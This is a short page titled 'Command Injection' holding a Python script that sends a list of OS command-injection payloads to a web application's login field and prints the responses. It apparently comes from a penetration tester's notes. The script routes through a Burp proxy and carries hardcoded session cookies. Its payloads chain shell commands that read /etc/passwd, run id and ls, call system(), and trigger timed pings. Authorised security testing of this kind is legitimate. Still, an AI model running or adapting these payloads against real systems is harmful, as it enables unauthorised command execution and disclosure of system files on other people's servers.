# Command Injection

```
import requests

# Set up Burp Proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080',
}

url = 'https://X.X.X.X:2004/dynamic.php?ref=https://10.10.73.12:2004/&target=login'
cookie_data = {'smi_sid': 'f8789576241f46ffbeb561e2e580b02b', 'PHPSESSID': 'f8789576241f46ffbeb561e2e580b02b'}
headers = {
    'Sec-Ch-Ua': '(Not(A:Brand";v="8", "Chromium";v="98"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
    'Sec-Ch-Ua-Platform': 'Windows',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://X.X.X.X:2004',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://X.X.X.X:2004/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close'
}

# List of payloads
payloads = [
    'web_admin',
    'web_admin; ls',
    'web_admin| ls',
    'web_admin| cat /etc/passwd',
    'web_admin; cat /etc/passwd',
    'web_admin&& cat /etc/passwd',
    'web_admin;$(ls)',
    'web_admin%0Als',
    ';system(\'/usr/bin/id\')',
    '%0Acat%20/etc/passwd',
    '%0A/usr/bin/id',
    '%0Aid',
    '%0A/usr/bin/id%0A',
    '%0Aid%0A',
    '& ping -i 30 10.10.73.99 &',
    '%0a ping -i 30 10.10.73.99 %0a',
]

for payload in payloads:
    payload_data = {
        'select_m': 'web',
        'login_name': payload,
        'p_pass': '79743cdfc1828d46603b8cc914cd36dd3d006462fd62120abb527486cd8ad0a0',
        'login_mode': '0'
    }

    response = requests.post(url, cookies=cookie_data, headers=headers, data=payload_data, proxies=proxies, verify=False)

    print(f"Payload: {payload}")
    print(response.text)
    print("-----------------------------------------")

```
